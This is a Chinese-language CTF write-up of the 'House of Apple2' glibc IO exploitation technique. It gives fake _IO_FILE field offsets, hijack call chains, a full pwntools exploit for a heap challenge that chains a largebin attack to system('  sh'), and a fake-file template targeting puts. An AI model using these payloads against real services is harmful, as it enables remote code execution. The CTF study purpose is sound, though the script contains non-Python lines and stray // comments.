---
title: House of Apple2
date: '2025-05-13 22:05:30'
updated: '2025-06-06 08:32:02'
---
[来自 roderick 师傅的博客](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)

## 前提条件
1. 已知 heap 地址和 glibc 地址
2. 能控制程序执行 IO 操作，包括但不限于：从 main 函数返回、调用 exit 函数、通过__malloc_assert 触发
3. 能控制_IO_FILE 的 vtable 和_wide_data，一般使用 largebin attack 去控制

## 利用原理
在调用`_wide_vtable` 里面的成员函数指针时，没有关于 vtable 的合法性检查

可以劫持 `IO_FILE` 的 vtable 为`_IO_wfile_jumps`，控制`_wide_data` 为可控的堆地址空间，进而控制`_wide_data->_wide_vtable` 为可控的堆地址空间

控制程序执行 IO 流函数调用，最终调用到_IO_WXXXXX 函数即可控制程序的执行流

目前在 glibc 源码中搜索到的_IO_WXXXXX 系列函数的调用只有`_IO_WSETBUF`、`_IO_WUNDERFLOW`、`<font style="background-color:#FBDE28;">_IO_WDOALLOCATE</font>`<font style="background-color:#FBDE28;"> 和</font>`<font style="background-color:#FBDE28;">_IO_WOVERFLOW</font>`。 其中`_IO_WSETBUF` 和`_IO_WUNDERFLOW` 目前无法利用或利用困难，其余的均可构造合适的`_IO_FILE` 进行利用

这里给出几条比较好利用的链（ fp 指代`_IO_FILE` 结构体变量）

## 利用_IO_wfile_overflow （已复现）
触发函数：`exit()`

`<font style="color:#DF2A3F;">exit()</font>`<font style="color:#DF2A3F;">会调用 _IO_flush_all_lockp，接着可以调用宏定义的 _OVERFLOW 从而调用到_IO_wfile_overflow</font>

对 fp 的设置如下：

+ _flags 设置为 ~( 0x2 | 0x8 | 0x800)，如果不需要控制 rdi，设置为 0 即可；如果需要获得 shell，可设置为

 `  sh;`，注意前面有两个空格

> |：按位 或 运算符
>
> ~：按位 取反 运算符
>
> ~( 0x2 | 0x8 | 0x800) = 0xfffff7F5
>

+ vtable 设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap 地址（加减偏移），使其能成功调用_IO_wfile_overflow 即可
+ _wide_data 设置为可控堆地址 A，即满足 *(fp + 0xa0) = A
+ _wide_data->_IO_write_base 设置为 0，即满足 *(A + 0x18) = 0
+ _wide_data->_IO_buf_base 设置为 0，即满足 *(A + 0x30) = 0
+ _wide_data->_wide_vtable 设置为可控堆地址 B，即满足 *(A + 0xe0) = B
+ _wide_data->_wide_vtable->doallocate 设置为地址 C 用于劫持 RIP，即满足 *(B + 0x68) = C

函数的调用链如下：

```c
_IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

### 轩辕杯 easy_heap
2.35 UAF 只能申请大于 0x410 大小的 chunk

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# link=remote("27.25.151.26",31137)
link=process('./heap')
elf=ELF("./heap")
libc=ELF('./glibc/2.35-0ubuntu3.9_amd64/libc.so.6')

def gdb_attach():
	gdb.attach(link,"set solib-search-path ~/FocusingCTF/glibc/2.35-0ubuntu3.9_amd64/")
	pause()

def add(idx,size):
	link.recvuntil(b'choice:')
	link.sendline(b'1')
	link.recvuntil(b"index:")
	link.sendline(str(idx))
	link.recvuntil(b"size:")
	link.sendline(str(size))

def delete(idx):
	link.recvuntil(b'choice:')
	link.sendline(b'2')
	link.recvuntil(b"index:")
	link.sendline(str(idx))

def edit(idx,content):
	link.recvuntil(b'choice:')
	link.sendline(b'3')
	link.recvuntil(b"index:")
	link.sendline(str(idx))
	link.recvuntil(b"content:")
	link.send(content)

def show(idx):
	link.recvuntil(b'choice:')
	link.sendline(b'4')
	link.recvuntil(b"index:")
	link.sendline(str(idx))

def exit():
	link.recvuntil(b'choice:')
	link.sendline(b'5')

gdb_attach()
add(9, 0x4f8)
add(0, 0x510)
add(1, 0x500) 
add(2, 0x520)
add(3, 0x500)
delete(2)
add(4, 0x530)
show(2)

_libc=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
# print(hex(libc))
libc_base=_libc-0x21b110
print(hex(libc_base))
_IO_list_all=libc_base+0x21b680

edit(2,b'a'*0x10)
show(2)
link.recvuntil(b'a'*0x10)
heap=u64(link.recv(6).ljust(8,b'\x00'))
print(hex(heap))
chunk0_addr=heap-0xa30
print(hex(chunk0_addr))

delete(0)
payload=p64(_libc)+p64(_libc)+p64(heap)+p64(_IO_list_all-0x20)
edit(2,payload)
add(5, 0x550)

------上面是largebin attack，下面是house of apple2------

edit(9, b'a'*0x4f0+b'  sh'.ljust(8,b'\x00'))

fake_file = flat({
	0x10: p64(0), #write_base=0
	0x18: p64(1), #write_ptr>write_base
	0x28: p64(0), #buf_base=0 
	0x58: p64(libc_base+libc.symbols['system']), #_wide_vtable->doallocate=system
	0x90: p64(chunk0_addr), #_wide_data=chunk0_addr
	0xc8: p64(libc_base + libc.symbols['_IO_wfile_jumps']), #vtable
	0xd0: p64(chunk0_addr) #_wide_vtable
}, filler=b"\x00")
edit(0,fake_file)

exit()

link.interactive()
```

## 利用_IO_wfile_underflow_mmap 
对 fp 的设置如下：

+ _flags 设置为 ~4，如果不需要控制 rdi，设置为 0 即可；如果需要获得 shell，可设置为 `  sh;`，注意前面有个空格
+ vtable 设置为_IO_wfile_jumps_mmap 地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap 即可
+ _IO_read_ptr < _IO_read_end，即满足 *(fp + 8) < *(fp + 0x10)
+ _wide_data 设置为可控堆地址 A，即满足 *(fp + 0xa0) = A
+ _wide_data->_IO_read_ptr >= _wide_data->_IO_read_end，即满足 *A >= *(A + 8)
+ _wide_data->_IO_buf_base 设置为 0，即满足 *(A + 0x30) = 0
+ _wide_data->_IO_save_base 设置为 0 或者合法的可被 free 的地址，即满足 *(A + 0x40) = 0
+ _wide_data->_wide_vtable 设置为可控堆地址 B，即满足 *(A + 0xe0) = B
+ _wide_data->_wide_vtable->doallocate 设置为地址 C 用于劫持 RIP，即满足 *(B + 0x68) = C

函数的调用链如下：

```c
_IO_wfile_underflow_mmap
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

## 利用_IO_wdefault_xsgetn 
这条链执行的条件是调用到_IO_wdefault_xsgetn 时 rdx 寄存器，也就是第三个参数不为 0。如果不满足这个条件，可选用其他链。

对 fp 的设置如下：

+ _flags 设置为 0x800
+ vtable 设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps 地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn 即可
+ _mode 设置为大于 0，即满足 *(fp + 0xc0) > 0
+ _wide_data 设置为可控堆地址 A，即满足 *(fp + 0xa0) = A
+ _wide_data->_IO_read_end == _wide_data->_IO_read_ptr 设置为 0，即满足 *(A + 8) = *A
+ _wide_data->_IO_write_ptr > _wide_data->_IO_write_base，即满足 *(A + 0x20) > *(A + 0x18)
+ _wide_data->_wide_vtable 设置为可控堆地址 B，即满足 *(A + 0xe0) = B
+ _wide_data->_wide_vtable->overflow 设置为地址 C 用于劫持 RIP，即满足 *(B + 0x18) = C

函数的调用链如下：

```c
_IO_wdefault_xsgetn
    __wunderflow
        _IO_switch_to_wget_mode
            _IO_WOVERFLOW
                *(fp->_wide_data->_wide_vtable + 0x18)(fp)
```

### 注意
不可以直接通过 stdout 的 FILE 指针直接修改 stdout 的 FILE 结构体，但是因为 stderr 可以直接通过 FILE 指针直接修改结构体，而 stderr 和 stdout 的 FILE 结构体是相邻的，所以可以直接溢出到 stdout 的 FILE 结构体来劫持

## puts 板子
来自题目 DeadsecCTF 2024 shadow

原本 puts 是调用_IO_sputn 的，劫持 vtable 到 wide_vtable(_IO_wfile_jump)里面的_IO_wfile_seekoff 了

要修改的东西如下(fp代指_IO_2_1_stdout_->file)：

+ vtable 改成_IO_wfile_jumps+0x10
+ fp -> _wide_data改成一个可控地址，这道题里直接改成了_IO_2_1_stdout_
+ fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
+ fp -> _wide_data -> _wide_vtable改成一个可控地址,这道题里改成了_IO_2_1_stdout_-8
+ fp -> _wide_data -> _wide_vtable -> overflow改成ogg或system

```c
fake_file = flat({
    0x0: b'  sh;',
    0x10: p64(libc_base + libc.symbols['system']),//fp -> _wide_data -> _wide_vtable -> overflow
    0x18: p64(0),//用来满足_IO_wfile_seekoff中was_writing=1
	0x20: p64(1),//用来满足_IO_wfile_seekoff中was_writing=1

    0x88: p64(libc_base + libc.symbols['_environ']-0x10),  //_lock
    0xa0: p64(libc_base + libc.symbols['_IO_2_1_stdout_']),//fp -> _wide_data
    0xd8: p64(libc_base + libc.symbols['_IO_wfile_jumps'] + 0x10),//vtable+0x10
    0xe0: p64(libc_base + libc.symbols['_IO_2_1_stdout_']-8), //fp -> _wide_data -> _wide_vtable
}, filler=b"\x00")
```

调用链：

```c
puts
	_IO_wfile_seekoff(条件：覆盖vtable改到wfile_jump+0x10)
		_IO_switch_to_wget_mode(条件：fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
			_IO_WOVERFLOW
				_wide_vtable中的__overflow(被劫持成system)
```

